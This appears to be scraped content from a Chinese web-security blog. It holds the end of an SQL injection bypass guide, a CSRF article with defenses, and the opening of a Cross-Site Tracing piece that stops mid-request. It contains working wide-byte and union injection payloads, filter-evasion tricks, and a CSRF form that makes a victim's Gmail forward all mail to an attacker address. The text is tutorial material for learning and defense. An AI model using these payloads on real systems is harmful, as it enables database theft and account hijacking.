ips等，这些检测系统一般都是用原生语言编写的，而这些语言检验字符串的结尾是通过检测空字节，在被检测系统检测的字符前面加上一个空字节就可以欺骗检测系统忽略被检测字符。%00-空字节 5.5 编码绕过 我们可以通过编码的方式欺骗后端的过滤机制 1. char select(char(67,58,45,56,67,45,35,44,3)); 2. 16进制编码 0x234532e34f2a34b 3. hex 4. unhex select convert(unhex('e3f23a44b445')using utf8) 5. to_base64(),from_base64() 5.6 引号被转义 背景知识: 字符集 在了解宽字节注入之前，我们先来看一看字符集是什么。字符集也叫字符编码，是一种将符号转换为二进制数的映射关系。 几种常见的字符集： ASCII编码：单字节编码 latin1编码：单字节编码 gbk编码：使用一字节和双字节编码，0x00-0x7F范围内是一位，和 ASCII 保持一致。双字节的第一字节范围是0x81-0xFE UTF-8编码：使用一至四字节编码，0x00–0x7F范围内是一位，和 ASCII 保持一致。其它字符用二至四个字节变长表示。 宽字节就是两个以上的字节，宽字节注入产生的原因就是各种字符编码的不当操作，使得攻击者可以通过宽字节编码绕过SQL注入防御。 GBK编码，是在GB2312-80标准基础上的内码扩展规范，使用了双字节编码方案，其编码范围从8140至FEFE（剔除xx7F），共23940个码位，共收录了21003个汉字，完全兼容GB2312-80标准，支持国际标准ISO/IEC10646-1和国家标准GB13000-1中的全部中日韩汉字，并包含了BIG5编码中的所有汉字——（摘自百度百科）。 字符反斜线“\\” 的ASCII码值是5C，占用一个字节，GBK编码方式可以将反斜线“\\”转换为一个服务器数据库不识别的汉字，即在5C前面拼接组合一个字符0xdf，那么数据库就会将0xdf5c转换为一个不识别的汉字，这样数据库就会将其忽略掉。 宽字节注⼊源于程序员设置MySQL连接时错误配置为：set character_set_client=gbk，这样配置会引发编码转换从⽽导致的注⼊漏洞。 具体原理如下：1，正常情况下当GPC开启或使⽤addslashes函数过滤GET或POST提交的参数时，⿊客使⽤的单引号'就会被转义为: '；2，但如果存在宽字节注⼊，我们输⼊%df%27时⾸先经过上⾯提到的单引号转义变成了%df%5c%27（%5c是反斜杠），之后在数据库查询前由于使⽤了GBK多字节编码，即在汉字编码范围内两个字节会被编码为⼀个汉字。然后MySQL服务器会对查询语句进⾏GBK编码即%df%5c转换成了汉字“運”，⽽单引号逃逸了出来，从⽽造成了注⼊漏洞。 GBK编码导致宽字节注⼊ GBK编码是数据库编码，跟前台的编码⽆关GBK转UTF-8 原理其实跟前⾯⾥原理⾥说的第2条是⼀样的，我们输⼊%df%27时⾸先经过上⾯提到的单引号转义变成了%df%5c%27（%5c是反斜杠），然后%df%5c正好属于gbk的汉字编码范围，经过iconv转换到utf-8编码转换后变成了汉字“運”，从⽽吞掉了反斜杠使得单引号逃脱出来。UTF-8转GBK 这⾥我们思考下“錦”这个字，它的utf-8编码是e98ca6，它的gbk编码是%e5%5c，⽽上⾯提到过反斜杠\\正好为%5c。所以如果我们将title设置为：錦’，⾸先经过addlashes函数或GPC对单引号转义变为：錦’，然后会经过icnov函数会对”錦”转化为gbk编码，最后就是：％e5％5c％5c％27。反斜杠被转义了（％5c％5c），从⽽单引号逃逸出来就会引发注⼊漏洞。 假设当前数据库使用GBK编码集，数据库会将输入的参数%df%5c解析为两个字节： ​ 其中%df为高位字节，编码位是223；%5c为低位字节，编码位是92；%df%5c的GBK编码取值范围就是：第一个字节是129—254，第二个字节是64—254，数据库会按照GBK编码将%df%5c解析成一个汉字，这样“\\”就会失去原来的作用。 在上图中，数据库将参数%df%5c按照GBK编码集解析成上图中的汉字：運，这种方式就是宽字节注入。 宽字节注入有前提：要求目标MYSQL数据库的编码方式是GBK编码，并且客户端必须和数据库的编码方式一致，这样才能使用宽字节注入方式，宽字节注入过程如下所示： 为了突破这个防护，我们可以使用宽字节注入的方式来进行突破，使用： %df ’ 当我们在单引号之前加上%df的时候，也就是输入%df ’ 这样传入到数据库中就会变成： %df%5c ’ 原理是在GBK编码中，%df与 \\ 的转义符%5c结合会编码成一个汉字，这样就使得 ’ 逃逸了。此外 %DE%5C,%E0%5C也都是可以的。 eg： 传入1’时，返回结果出现1’ ',此处是不存在sql注入漏洞的，但是有一个特例，就是当数据库编码为GBK时可以使用宽字节注入，宽字节的格式是在地址后加一个%df，再加单引号，因为反斜杠的编码为%5c，而再GBK编码中%df%5c为一个繁体字，此时查询就会出错，一般结合Union注入使用。 1%df' union select 1,2,3 %23查看输出位置 查询表名时，一般使用语句 1%df' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() %23 查询列名的时候会有所不同，因为对单引号进行了过滤 select 1,2,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=(select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()) %23 还有一些例如cookie注入，base64注入，和XFF注入，类型相似，不一一讲解了 and ⇒ &amp;&amp; or =&gt; || &lt; &gt; = =&gt; between() ,like limit 0,1 =&gt; limit 0 offset 1 substr =&gt; substring mid left right sleep =&gt; benchmark 5.7 HTTP参数污染 客户端在访问服务器端时，需要先经过一个tomcat服务器，这个tomcat服务器中部署的过滤代码充当了waf的功能。输入的参数经过tomcat服务器过滤后，再被传入到真正的服务端apache服务器上处理，然后逐层返回到客户端。 这里传入的参数只有一个，名为id，当我们强行传入两个名都为id的参数时，waf获取的是第一个参数，而忽略第二个参数，则对第二个参数的内容不做任何检查和过滤，这样第二个参数就可以传入到apache服务器端，进行解析。 我们在url后面输入login.php进入到受waf保护的界面 ?id=0&amp;id=-1' union select 1,2,database() --+ 5.8 预编译绕过 5.8.1 简介 SQL注入是因为解释器将传入的数据当成命令执行而导致的，预编译是用于解决这个问题的一种方法。和普通的执行流程不同，预编译将一次查询通过两次交互完成，第一次交互发送查询语句的模板，由后端的SQL引擎进行解析为AST或Opcode，第二次交互发送数据，代入AST或Opcode中执行。因为此时语法解析已经完成，所以不会再出现混淆数据和代码的过程。 5.8.2 模拟预编译 为了防止低版本数据库不支持预编译的情况，模拟预编译会在客户端内部模拟参数绑定的过程，进行自定义的转义。 5.8.3 绕过 5.8.3.1 预编译使用错误 预编译只是使用占位符替代的字段值的部分，如果第一次交互传入的命令使用了字符串拼接，使得命令是攻击者可控的，那么预编译不会生效。 5.8.3.2 部分参数不可预编译 在有的情况下，数据库处理引擎会检查数据表和数据列是否存在，因此数据表名和列名不能被占位符所替代。这种情况下如果表名和列名可控，则可能引入漏洞。 5.8.3.3 预编译实现错误 部分语言引擎在实现上存在一定问题，可能会存在绕过漏洞。 5.9 绕过or和and的 1、大小写变形：将原本的 or 和 and 替换为：Or、oR、And、AND、aND、aNd等等。 2、转换编码输入：将 or 和 and 使用hex，urlencode等编码方式进行转换后在输入。 3、添加注释（内联注释）：例如：/*or*/，中间的语句会被mysql中解析（一般其他数据库不会） 注释符如下: # --+ /*xxx*/ /*!xxx*/ /*!50000xxx*/ 4、双写绕过：例如：oorr，aandnd 等。 5、可以使用%26%26代替and。%26 代表字符 '&amp;' 。有时候&amp;&amp;不能用但是可以使用%26%26反正就这两个轮换着试验，哪个可行用哪个。 6、利用符号：and替换为&amp;&amp;、or替换为|| 5.10 绕过空格和注释符 绕过注释符方法：使用 or '1'='1 或者 and '1'='1 替换，这里理解一下注释符号的作用就可以，我们只要把后面的符号想办法闭合就可以，单引号可以随时替换，主要是根据sql语句的闭合方式决定使用什么符号闭合。 绕过空格方法： 1、/**/（注释绕过） 2、%09 Tab键（水平） 3、%0a 新建一行 4、%0c 新的一页 5、%0d return 键 6、%0b Tab键（垂直） 7、%a0 空格 8、() 绕过，主要通过括号去将某些语句独立起来，这样就不需要空格了。 以上都可以用来绕过。一般过滤了空格之后，联合注入以及双查询注入等就不推荐使用了（Windows系统的前提，如果是LINUX系统直接使用等价字符绕过空格就可以），最好使用报错注入中的 extractvalue()函数 以及 updatexml()函数 进行报错注入。 0x06 Mysql常见函数 =、&gt;、&gt;=、&lt;= 、&lt;&gt; 比较运算符 and、or 逻辑运算符 version( ) mysql数据库版本 database( ) 当前数据库名 sleep( ) 睡眠时间为指定的秒数 if(true,t,f) if判断 length( ) 返回字符串的长度 substring( ) 截取字符串三个函数作用相同有三个参数 mid(“1”,2,3)1.截取的字符串2.截取起始位置，从1开始计数3.截取长度 substr( ) 截取字符串三个函数作用相同有三个参数 mid(“1”,2,3)1.截取的字符串2.截取起始位置，从1开始计数3.截取长度 mid( ) 截取字符串三个函数作用相同有三个参数 mid(“1”,2,3)1.截取的字符串2.截取起始位置，从1开始计数3.截取长度 left( ) 从左侧开始取指定字符个数的字符串 concat( ) 没有分隔符的连接字符串 concat_ws ( ) 含有分割符的连接字符串 group_conat( ) 连接一个组的字符串 ord( ) 返回ASCII码 ascii( ) 返回ASCII码 hex( ) 将字符串转换为十六进制 unhex( ) hex的反向操作 md5( ) 返回MD5值 floor(x) 返回不大于x的最大整数 round ( ) 返回参数x接近的整数 rand( ) 返回0-1之间的随机浮点数 load_file( ) 读取文件，并返回文件内容作为一个字符串 find_in_set( ) 返回字符串在字符串列表中的位置 benchmark( ) 指定语句执行的次数 name_const ( ) 返回表作为结果 user( ) 用户名 current_user( ) 当前用户名 system_ user( ) 系统用户名 @@datadir 数据库路径 @@versoin_compile_os 操作系统版本 user() //返回当前使用数据库的用户 version() //返回当前数据库的版本 database() //返回当前使用的数据库 group_concat() //多行数据拼接至一行显示+group_by根据分组排序 concat_ws() //把不同列的数据以特定字符隔开 # -- --+ //在MYSQL中的注释符 （注意:有时候注释符需要多试几种，有的时候--+不行，但是#可以） order by //排序函数 判断列 原理：order by 后面跟哪个列名就是通过跟哪个列进行排序，如果后面跟的是数字，那么1就代表根据第一列排序，2代表第二列，3代表第三列，那么一直输入数字的大小就可以判断数据表有多少列了 count() //计数函数 报错时候可以用到，或者布尔注入和延时注入时查询有多少个表，多少个列的时候可以用到 rand() //产生一个随机数返回的随机数是大于等于 0 及小于 1 的均匀分布随机实数 报错注入时候有用 updatexml(XML_document, XPath_string, new_value); 第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc 第二个参数：XPath_string (Xpath格式的字符串) ，如果不了解Xpath语法，可以在网上查找教程。 第三个参数：new_value，String格式，替换查找到的符合条件的数据 作用：改变文档中符合条件的节点的值 extractvalue() :对XML文档进行查询的函数 其实就是相当于我们熟悉的HTML文件中用 &lt;div&gt;&lt;p&gt;&lt;a&gt;标签查找元素一样 语法：extractvalue(目标xml文档，xml路径) 第二个参数 xml中的位置是可操作的地方，xml文档中查找字符位置是用 /xxx/xxx/xxx/…这种格式，如果我们写入其他格式，就会报错，并且会返回我们写入的非法格式内容，而这个非法的内容就是我们想要查询的内容。 INFORMATION_SCHEMA数据库 mysql5.0以下没有该表 0x07 数据库检测 7.1 MySQL sleep sleep(1) benchmark BENCHMARK(5000000, MD5('test')) 字符串连接 SELECT 'a' 'b'``SELECT CONCAT('some','string') version SELECT @@version``SELECT version() 识别用函数 connection_id()``last_insert_id()``row_count() 7.2 Oracle 字符串连接 'a'||'oracle' --``SELECT CONCAT('some','string') version SELECT banner FROM v$version``SELECT banner FROM v$version WHERE rownum=1 7.3 SQLServer WAITFOR WAITFOR DELAY '00:00:10'; SERVERNAME SELECT @@SERVERNAME version SELECT @@version 字符串连接 SELECT 'some'+'string' 常量 @@pack_received``@@rowcount 7.4 PostgreSQL sleep pg_sleep(1)","categories":["常见top漏洞"]},{"title":"浅析CSRF漏洞","path":"/2023/08/06/qian-xi-csrf-lou-dong/","content":"1、CSRF漏洞介绍 CSRF(Cross-Site Request Forgery,跨站请求伪造)，也被称为 one-click attack 或者 session riding，通常缩写为 CSRF 或者 XSRF .它是一种常见的 Web攻击方式。是一种劫持用户在当前已登录的Web应用程序上执行非本意操作一种攻击. 说的直白一点就是:别人盗用(劫持)你的身份去做坏事. （1）别人--&gt;这里指的是攻击者 （2）你----&gt;A站(web服务器)上注册的合法用户(客户端) （3）做坏事---&gt;去请求合法站点A(比如web服务器)存在CSRF攻击的URL,实现类似发送恶意邮件/转账/创建账户/修改密码等\"你不希望执行\"操作. 1.1 危害 以用户的名义发邮件/发消息 转换/购买商品等; 修改密码; 删除文章等 2、CSRF漏洞的原理 2.1 CSRF漏洞产生的原因 (1)http协议使用session在服务端保存用户的个人信息,客户端浏览器用cookie标识用户身份; (2)cookie的认证只能确保是某个用户发送的请求,但是不能保证这个请求是否是\"用户自愿的行为\". (3)这时,用户登录了某个web站点,同时点击了包含CSRF恶意代码的URL,就会触发CSRF 2.2 漏洞利用的条件 (1)用户必须登录A网站,生成了cookie (2)登录的同时访问了恶意URL(包含CSRF恶意代码的URL). 2.3 CSRF和XSS的不同 (1)XSS主要用户获取用户的cookie信息,达到控制客户端的目的 XSS----&gt;把你的腰牌(用户身份象征也就是cookie)偷到手,黑客自己去搞破坏. CSRF主要是劫持用户身份,让客户端做一些不愿意做的事. CSRF----&gt;拿刀劫持你,\"借助你的身份\"来帮黑客做事. (2)危害上来说,XSS更大; (3)从应用难度上来说 CSRF需要满足登录某网站的状态,同时访问了恶意的URL,应用条件比较苛刻. XSS只要一次点击或者存储到服务器即可. 3、CSRF之GET型代码分析 GET型CSRF代码举例 问题： （1）但是URL直接写用户名和密码的方式太过于明显,我们可以通过访问页面的方式进行伪装; （2）或者通过XSS页面,直接把这个恶意URL链接发给客户端,在客户登录页面的同时访问这个恶意URL,也可以创建用户; （3）通过伪造页面诱导客户点击 4、CSRF之POST型代码分析 （1）有人说,GET方式容易出现CSRF攻击,那用post是不是就可以万无一失呢? （2）当然不是,因为post只是提交的方式改变了,如果原始页面还是存在CSRF漏洞,我们自己创建一个POST页面来模拟用户提交数据,还是可以进行利用的 （3）post_csrf.php用来模拟存在csrf漏洞的web页面,代码如下： （4）页面显示如下： post型需要黑客自己来构造表单提交的参数 为了不易发现,提交表单的数据都直接隐藏hidden; post.html代码如下: 5、DVWA中CSRF利用实战 5.1 挖掘CSRF的方法: (1)使用burp抓包后修改Referer字段再重新提交,如果能请求就存在CSRF漏洞. (2)其他CSRF工具,比如 CSRFTester就是通过抓取提交参数; 修改表单信息,重新提交;-----&gt;伪造客户端请求 重新提交成功就存在CSRF漏洞. DVWA中low级别CSRF:没有对输入做过滤,而且也没有原密码认证 6、csrf案例 6.1 Gmail 小明的悲惨遭遇 这一天，小明同学百无聊赖地刷着Gmail邮件。大部分都是没营养的通知、验证码、聊天记录之类。但有一封邮件引起了小明的注意： 甩卖比特币，一个只要998！！ 聪明的小明当然知道这种肯定是骗子，但还是抱着好奇的态度点了进去（请勿模仿）。果然，这只是一个什么都没有的空白页面，小明失望的关闭了页面。一切似乎什么都没有发生…… 在这平静的外表之下，黑客的攻击已然得手。小明的Gmail中，被偷偷设置了一个过滤规则，这个规则使得所有的邮件都会被自动转发到hacker@hackermail.com。小明还在继续刷着邮件，殊不知他的邮件正在一封封地，如脱缰的野马一般地，持续不断地向着黑客的邮箱转发而去。 不久之后的一天，小明发现自己的域名已经被转让了。懵懂的小明以为是域名到期自己忘了续费，直到有一天，对方开出了 $650 的赎回价码，小明才开始觉得不太对劲。 小明仔细查了下域名的转让，对方是拥有自己的验证码的，而域名的验证码只存在于自己的邮箱里面。小明回想起那天奇怪的链接，打开后重新查看了“空白页”的源码： &lt;form method=\"POST\" action=\"https://mail.google.com/mail/h/ewt1jmuj4ddv/?v=prf\" enctype=\"multipart/form-data\"&gt; &lt;input type=\"hidden\" name=\"cf2_emc\" value=\"true\"/&gt; &lt;input type=\"hidden\" name=\"cf2_email\" value=\"hacker@hakermail.com\"/&gt; ..... &lt;input type=\"hidden\" name=\"irf\" value=\"on\"/&gt; &lt;input type=\"hidden\" name=\"nvp_bu_cftb\" value=\"Create Filter\"/&gt; &lt;/form&gt; &lt;script&gt; document.forms[0].submit(); &lt;/script&gt; 这个页面只要打开，就会向Gmail发送一个post请求。请求中，执行了“Create Filter”命令，将所有的邮件，转发到“hacker@hackermail.com”。 小明由于刚刚就登陆了Gmail，所以这个请求发送时，携带着小明的登录凭证（Cookie），Gmail的后台接收到请求，验证了确实有小明的登录凭证，于是成功给小明配置了过滤器。 黑客可以查看小明的所有邮件，包括邮件里的域名验证码等隐私信息。拿到验证码之后，黑客就可以要求域名服务商把域名重置给自己。 小明很快打开Gmail，找到了那条过滤器，将其删除。然而，已经泄露的邮件，已经被转让的域名，再也无法挽回了…… 以上就是小明的悲惨遭遇。而“点开一个黑客的链接，所有邮件都被窃取”这种事情并不是杜撰的，此事件原型是2007年Gmail的CSRF漏洞 7、CSRF漏洞防御 修改密码时,需要原密码; 对客户来讲,不要点击来历不明的链接或图片;养成定时退出的好习惯;安装安全防护软件等 验证 Referer/Content-Type 对于用户修改删除等操作最好都使用POST操作 避免全站通用的Cookie，严格设置Cookie的域 CSRF通常从第三方网站发起，被攻击的网站无法防止攻击发生，只能通过增强自己网站针对CSRF的防护能力来提升安全性。 上文中讲了CSRF的两个特点： CSRF（通常）发生在第三方域名。 CSRF攻击者不能获取到Cookie等信息，只是使用。 针对这两点，我们可以专门制定防护策略，如下： 阻止不明外域的访问 同源检测 Samesite Cookie 提交时要求附加本域才能获取的信息 CSRF Token 双重Cookie验证 以下我们对各种防护方法做详细说明。 7.1 同源检测 既然CSRF大多来自第三方网站，那么我们就直接禁止外域（或者不受信任的域名）对我们发起请求。 那么问题来了，我们如何判断请求是否来自外域呢？ 在HTTP协议中，每一个异步请求都会携带两个Header，用于标记来源域名： Origin Header Referer Header 这两个Header在浏览器发起请求时，大多数情况会自动带上，并且不能由前端自定义内容。 服务器可以通过解析这两个Header中的域名，确定请求的来源域。 使用Origin Header确定来源域名 在部分与CSRF有关的请求中，请求的Header中会携带Origin字段。字段内包含请求的域名（不包含path及query）。 如果Origin存在，那么直接使用Origin中的字段确认来源域名就可以。 但是Origin在以下两种情况下并不存在： IE11同源策略： IE 11 不会在跨站CORS请求上添加Origin标头，Referer头将仍然是唯一的标识。最根本原因是因为IE 11对同源的定义和其他浏览器有不同，有两个主要的区别，可以参考MDN Same-origin_policy#IE_Exceptions 302重定向： 在302重定向之后Origin不包含在重定向的请求中，因为Origin可能会被认为是其他来源的敏感信息。对于302重定向的情况来说都是定向到新的服务器上的URL，因此浏览器不想将Origin泄漏到新的服务器上。 使用Referer Header确定来源域名 根据HTTP协议，在HTTP头中有一个字段叫Referer，记录了该HTTP请求的来源地址。 对于Ajax请求，图片和script等资源请求，Referer为发起请求的页面地址。对于页面跳转，Referer为打开页面历史记录的前一个页面地址。因此我们使用Referer中链接的Origin部分可以得知请求的来源域名。 这种方法并非万无一失，Referer的值是由浏览器提供的，虽然HTTP协议上有明确的要求，但是每个浏览器对于Referer的具体实现可能有差别，并不能保证浏览器自身没有安全漏洞。使用验证 Referer 值的方法，就是把安全性都依赖于第三方（即浏览器）来保障，从理论上来讲，这样并不是很安全。在部分情况下，攻击者可以隐藏，甚至修改自己请求的Referer。 7.2 Token防御 CSRF漏洞实质：服务器无法准确判断当前请求是否是合法用户的自定义操作 漏洞修补逻辑分析:如果服务器在用户登录之后给予用户一个唯一合法令牌，每一次操作过程中，服务器都会验证令牌是否正确，如果正确那么执行操作，不正确不执行操作。 一般情况下，给予的令牌写入表单隐藏域的value中，随着表单内容进行提交 Token防御代码分析 代码的意思是hello加上当前时间进行md5编码，当然hello可以改为其它复杂的字符串，这样不容易被破解出来，每一秒的值都会发生变化，如 实例使用Token进行CSRF防御 1.登陆验证成功之后，在会话SESSION[“user_token”]中保存Token 2.在后台操作中，增删改表单中添加隐藏域hidden，设置value为Token 3.提交之后验证Token是否正确 附上代码 &lt;?php session_start(); function token_generate() { $salt = \"hello\".date(\"h:i:s\"); $token = md5($salt); return $token; } $token = token_generate(); $_SESSION[\"user_token\"] = $token; ?&gt; &lt;html&gt; &lt;head&gt; &lt;meta charset=\"utf-8\"&gt; &lt;title&gt;CSRF_TOKEN&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;h1&gt;CSRF_TOKEN&lt;/h1&gt; &lt;form action=\"check.php\" method=\"post\"&gt; &lt;input type=\"text\" value=\"111\"&gt; &lt;input type=\"hidden\" name=\"user_token\" value=\"&lt;?php echo $token;?&gt;\"&gt; &lt;input type=\"submit\" name=\"submit\" value=\"提交\"&gt; &lt;/form&gt; &lt;/body&gt; &lt;/html&gt; 再附上check.php验证脚本代码 &lt;?php session_start(); $user_token = $_POST[\"user_token\"]; if($_SESSION[\"user_token\"] == $user_token) { echo $_SESSION[\"user_token\"]; echo \"&lt;br&gt;\"; echo \"$user_token\"; echo \"&lt;br&gt;\"; echo \"successful\"; } else { echo \"fail\"; } ?&gt; 为何token可以有效地防御： token 是被开发者发送给后端的，攻击者如果无法获取到token 是无法通过后端服务器的校验的 但是cookie 不同，只要在同一个浏览器，浏览器就会自动将cookie 放入请求头中，如果用cookie 做登录验证，在同一个浏览器并且一登陆的情况下后端服务器将自动识别cookie 对请求进行放行例如： 小明登录了csdn, 此时小明突然想到了一件事情，登录了另一个网站，而这个网站被不知名的人埋入了一些请求，这些请求是当其他人进入该网站，则请求csdn 友好的帮助访问者发布一篇文章， 假如csdn 使用的是cookie做登录判断，小明访问该网站时触发了该请求，浏览器会自动将cookie 放入请求头中传给后端，后端服务器判断cookie 是已登录则放行了该网站的操作，小明在不知情的情况下被发布的一篇文章，这里只是一个例子，但是如果这里的请求变为自动将小明的钱包余额转账给那位不知名的人，就比较危险了 而如果使用token,token 并不会自动被浏览器放入请求头，当其他攻击者像服务器发送请求时，是不会携带token 的，后端服务器没有获取到token 则不会对请求进行放行，保证了用户数据的安全性 Referer防御CSRF原理：HTTP Referer是header的一部分，当浏览器向web服务器发送请求的时候，一般会带上Referer，告诉服务器我是从哪个页面链接过来的，服务器基于此可以获得一些信息用于处理 当用户点击被构造好的CSRF利用页面，那么在执行用户对应操作时，提交的HTTP请求中就有对应的Referer值，此时服务端判断Referer值是否与服务器的域名信息有关，如果不关则不执行操作 Refer防御代码编写 在PHP中使用$_SERVER[‘HTTP_REFERER’]获取页面提交请求中的Referer值 这里需要用到一个strpos函数，用法参考https://www.w3school.com.cn/php/func_string_strpos.asp 附上防御代码： strpos函数里面的意思也就是在获取的Referer值里面是否包含xx.com这个域名，如果包含了说明是正确的，没包含就可能是恶意的 7.4 验证码防御CSRF 验证码防御被认为是对抗CSRF最简单而且有效的防御方法，CSRF在用户不知情的情况下完成对应操作，而验证码强制用户与应用程序交互，才能最终完成操作，可以被认为是二次验证，但是出于对用户体验考虑，不可能每一次操作都加入验证码。所以验证码只是一种辅助手段，不能作为防御CSRF的主要解决方案 理论上讲，在提交表单或者GET请求的地方，凡是没有用户进行二次验证或没有csrftoken(其他网站可能不叫csrftoken)的地方大概率存在csrf漏洞。 7.5 双重Cookie验证 在会话中存储CSRF Token比较繁琐，而且不能在通用的拦截上统一处理所有的接口。 那么另一种防御措施是使用双重提交Cookie。利用CSRF攻击不能获取到用户Cookie的特点，我们可以要求Ajax和表单请求携带一个Cookie中的值。 双重Cookie采用以下流程： 在用户访问网站页面时，向请求域名注入一个Cookie，内容为随机字符串（例如csrfcookie=v8g9e4ksfhw）。 在前端向后端发起请求时，取出Cookie，并添加到URL的参数中（接上例POST https://www.a.com/comment?csrfcookie=v8g9e4ksfhw）。 后端接口验证Cookie中的字段与URL参数中的字段是否一致，不一致则拒绝。 此方法相对于CSRF Token就简单了许多。可以直接通过前后端拦截的的方法自动化实现。后端校验也更加方便，只需进行请求中字段的对比，而不需要再进行查询和存储Token。 当然，此方法并没有大规模应用，其在大型网站上的安全性还是没有CSRF Token高，原因我们举例进行说明。 由于任何跨域都会导致前端无法获取Cookie中的字段（包括子域名之间），于是发生了如下情况： 如果用户访问的网站为www.a.com，而后端的api域名为api.a.com。那么在www.a.com下，前端拿不到api.a.com的Cookie，也就无法完成双重Cookie认证。 于是这个认证Cookie必须被种在a.com下，这样每个子域都可以访问。 任何一个子域都可以修改a.com下的Cookie。 某个子域名存在漏洞被XSS攻击（例如upload.a.com）。虽然这个子域下并没有什么值得窃取的信息。但攻击者修改了a.com下的Cookie。 攻击者可以直接使用自己配置的Cookie，对XSS中招的用户再向www.a.com下，发起CSRF攻击。 总结： 用双重Cookie防御CSRF的优点： 无需使用Session，适用面更广，易于实施。 Token储存于客户端中，不会给服务器带来压力。 相对于Token，实施成本更低，可以在前后端统一拦截校验，而不需要一个个接口和页面添加。 缺点： Cookie中增加了额外的字段。 如果有其他漏洞（例如XSS），攻击者可以注入Cookie，那么该防御方式失效。 难以做到子域名的隔离。 为了确保Cookie传输安全，采用这种防御方式的最好确保用整站HTTPS的方式，如果还没切HTTPS的使用这种方式也会有风险。 7.6 Samesite Cookie属性 防止CSRF攻击的办法已经有上面的预防措施。为了从源头上解决这个问题，Google起草了一份草案来改进HTTP协议，那就是为Set-Cookie响应头新增Samesite属性，它用来标明这个 Cookie是个“同站 Cookie”，同站Cookie只能作为第一方Cookie，不能作为第三方Cookie，Samesite 有两个属性值，分别是 Strict 和 Lax，下面分别讲解： Samesite=Strict 这种称为严格模式，表明这个 Cookie 在任何情况下都不可能作为第三方 Cookie，绝无例外。比如说 b.com 设置了如下 Cookie： Set-Cookie: foo=1; Samesite=Strict Set-Cookie: bar=2; Samesite=Lax Set-Cookie: baz=3 我们在 a.com 下发起对 b.com 的任意请求，foo 这个 Cookie 都不会被包含在 Cookie 请求头中，但 bar 会。举个实际的例子就是，假如淘宝网站用来识别用户登录与否的 Cookie 被设置成了 Samesite=Strict，那么用户从百度搜索页面甚至天猫页面的链接点击进入淘宝后，淘宝都不会是登录状态，因为淘宝的服务器不会接受到那个 Cookie，其它网站发起的对淘宝的任意请求都不会带上那个 Cookie。 Samesite=Lax 这种称为宽松模式，比 Strict 放宽了点限制：假如这个请求是这种请求（改变了当前页面或者打开了新页面）且同时是个GET请求，则这个Cookie可以作为第三方Cookie。比如说 b.com设置了如下Cookie： Set-Cookie: foo=1; Samesite=Strict Set-Cookie: bar=2; Samesite=Lax Set-Cookie: baz=3 当用户从 a.com 点击链接进入 b.com 时，foo 这个 Cookie 不会被包含在 Cookie 请求头中，但 bar 和 baz 会，也就是说用户在不同网站之间通过链接跳转是不受影响了。但假如这个请求是从 a.com 发起的对 b.com 的异步请求，或者页面跳转是通过表单的 post 提交触发的，则bar也不会发送。 生成Token放到Cookie中并且设置Cookie的Samesite，Java代码如下： private void addTokenCookieAndHeader(HttpServletRequest httpRequest, HttpServletResponse httpResponse) { //生成token String sToken = this.generateToken(); //手动添加Cookie实现支持“Samesite=strict” //Cookie添加双重验证 String CookieSpec = String.format(\"%s=%s; Path=%s; HttpOnly; Samesite=Strict\", this.determineCookieName(httpRequest), sToken, httpRequest.getRequestURI()); httpResponse.addHeader(\"Set-Cookie\", CookieSpec); httpResponse.setHeader(CSRF_TOKEN_NAME, token); } 代码源自OWASP Cross-Site_Request_Forgery #Implementation example 如何使用SamesiteCookie 如果SamesiteCookie被设置为Strict，浏览器在任何跨域请求中都不会携带Cookie，新标签重新打开也不携带，所以说CSRF攻击基本没有机会。 但是跳转子域名或者是新标签重新打开刚登陆的网站，之前的Cookie都不会存在。尤其是有登录的网站，那么我们新打开一个标签进入，或者跳转到子域名的网站，都需要重新登录。对于用户来讲，可能体验不会很好。 如果SamesiteCookie被设置为Lax，那么其他网站通过页面跳转过来的时候可以使用Cookie，可以保障外域连接打开页面时用户的登录状态。但相应的，其安全性也比较低。 另外一个问题是Samesite的兼容性不是很好，现阶段除了从新版Chrome和Firefox支持以外，Safari以及iOS Safari都还不支持，现阶段看来暂时还不能普及。 而且，SamesiteCookie目前有一个致命的缺陷：不支持子域。例如，种在topic.a.com下的Cookie，并不能使用a.com下种植的SamesiteCookie。这就导致了当我们网站有多个子域名时，不能使用SamesiteCookie在主域名存储用户登录信息。每个子域名都需要用户重新登录一次。 总之，SamesiteCookie是一个可能替代同源验证的方案，但目前还并不成熟，其应用场景有待观望。","categories":["常见top漏洞"]},{"title":"浅谈CST攻击","path":"/2023/08/06/qian-tan-cst-gong-ji/","content":"全称Cross-Site-Tracing\"简称为 CST / XST - 跨站式追踪攻击 先简述相关概念 0x01 XSS与httponly ​ 正常情况下，客户端脚本（如JS脚本）是可以通过document.cookie函数获得cookie信息，这样如果有XSS跨站漏洞，cookie很容易被盗取。浏览器有一个安全策略，通过设置cookie的httponly属性，这样客户端脚本就不能通过document.cookie访问该cookie，即使有XSS漏洞，也不能盗取用户cookie。这个时候就可以利用HTTP TRACE方法来获取到用户的cookie信息。 0x02 什么是httponly 如果cookie中设置了HttpOnly属性，那么通过js脚本将无法读取到cookie信息，这样能有效的防止XSS攻击窃取cookie内容 如何开启 PHP5.2以上版本已支持HttpOnly参数的设置 同样也支持全局的HttpOnly的设置， 在php.ini中设置 session.cookie_httponly = 1 将开启全局的Cookie的HttpOnly属性。 也可以通过代码来实现 &lt;?php ini_set(\"session.cookie_httponly\", 1); //或 session_set_cookie_params(0, NULL, NULL, NULL, TRUE); ?&gt; 0x03 什么是TRACE方法 ​ TRACE作用：客户端发起一个请求时，这个请求可能要穿过防火墙、代理、网关或其他一些应用程序。每个中间节点都可能会修改原始的 HTTP 请求。TRACE 方法允许客户端在 最终将请求发送给服务器时，看看它变成了什么样子。 ​ TRACE 请求会在目的服务器端发起一个 环回 诊断。行程最后一站的服务器会弹回一条 TRACE 响应，并在响应主体中携带它收到的原始请求报文。这样客户端就可以查看在所有中间 HTTP 应用程序组成的请求 / 响应链上，原始报文是否，以及如何被毁坏或修改过。 0x04 TRACE工作方法 下面就来看下允许TRACE方法的服务器，TRACE方法是如何工作的。 请求包: TRACE http://10.20.40.95/bWAPP/bWAPP/xss_get.php?firstname=aaaa&amp;lastname=aaa&amp;form=submit HTTP/1.1 Host: 10.20.40.95 Connection: keep-alive Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) 